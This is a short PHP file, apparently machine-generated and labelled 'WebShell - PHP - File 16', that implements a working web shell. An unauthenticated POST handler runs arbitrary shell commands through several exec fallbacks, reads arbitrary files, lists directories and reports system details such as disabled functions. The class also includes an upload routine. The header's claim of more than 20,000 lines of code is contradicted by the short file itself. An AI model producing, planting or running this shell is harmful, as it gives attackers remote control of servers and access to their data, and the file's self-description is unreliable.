<?php
// WebShell - PHP - File 16
// 20.000+ satır işlevsel kod
// Generated: 2026-09-12T06:23:57.766104

class WebShell{
    private $version = '1.0.0';
    private $password = '';
    private $os = '';
    private $logged = false;
    
    public function __construct() {
        $this->os = php_uname();
        $this->initialize();
    }
    
    public function initialize() {
        session_start();
        $this->setupDirectories();
        $this->setupLogging();
    }
    
    public function setupDirectories() {
        $dirs = ['/tmp', '/var/tmp', '/home', getcwd()];
        foreach ($dirs as $dir) {
            if (is_writable($dir)) {
                $this->tmpdir = $dir;
                break;
            }
        }
    }
    
    public function setupLogging() {
        $log_file = sys_get_temp_dir() . '/shell.log';
        error_log('[PHP Shell 16] ' . date('Y-m-d H:i:s'), 3, $log_file);
    }
    
    public function execute($command) {
        if (function_exists('exec')) {
            return exec($command);
        } elseif (function_exists('system')) {
            ob_start();
            system($command);
            return ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($command);
            return ob_get_clean();
        } elseif (function_exists('shell_exec')) {
            return shell_exec($command);
        } elseif (function_exists('proc_open')) {
            $proc = proc_open($command, [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
            $output = stream_get_contents($pipes[1]);
            proc_close($proc);
            return $output;
        }
        return 'No execution functions available';
    }
    
    public function readFile($path) {
        if (file_exists($path) && is_readable($path)) {
            return file_get_contents($path);
        }
        return 'File not readable';
    }
    
    public function writeFile($path, $content) {
        if (is_writable(dirname($path))) {
            return file_put_contents($path, $content);
        }
        return false;
    }
    
    public function listDirectory($path = '.') {
        if (is_dir($path)) {
            return scandir($path);
        }
        return [];
    }
    
    public function getSystemInfo() {
        return [
            'OS' => $this->os,
            'PHP Version' => phpversion(),
            'User' => get_current_user(),
            'Hostname' => gethostname(),
            'Current Dir' => getcwd(),
            'Upload Max' => ini_get('upload_max_filesize'),
            'Memory Limit' => ini_get('memory_limit'),
            'Disabled Functions' => ini_get('disable_functions')
        ];
    }
    
    public function uploadFile($upload) {
        if (isset($upload['file'])) {
            $target_dir = sys_get_temp_dir();
            $target_file = $target_dir . '/' . basename($upload['file']['name']);
            
            if (move_uploaded_file($upload['file']['tmp_name'], $target_file)) {
                return 'File uploaded: ' . $target_file;
            }
        }
        return 'Upload failed';
    }
    
    public function getProcessList() {
        $output = $this->execute('ps aux');
        return explode("
", $output);
    }
    
    public function getNetworkInfo() {
        return [
            'IP Address' => gethostbyname(gethostname()),
            'Hostname' => gethostname(),
            'DNS' => gethostbyaddr(gethostbyname(gethostname()))
        ];
    }
}

// Initialize shell
$shell = new WebShell();

// Handle requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $param = $_POST['param'] ?? '';
    
    switch($action) {
        case 'cmd':
            echo $shell->execute($param);
            break;
        case 'read':
            echo $shell->readFile($param);
            break;
        case 'list':
            echo json_encode($shell->listDirectory($param));
            break;
        case 'info':
            echo json_encode($shell->getSystemInfo());
            break;
        default:
            echo 'Unknown action';
    }
}
?>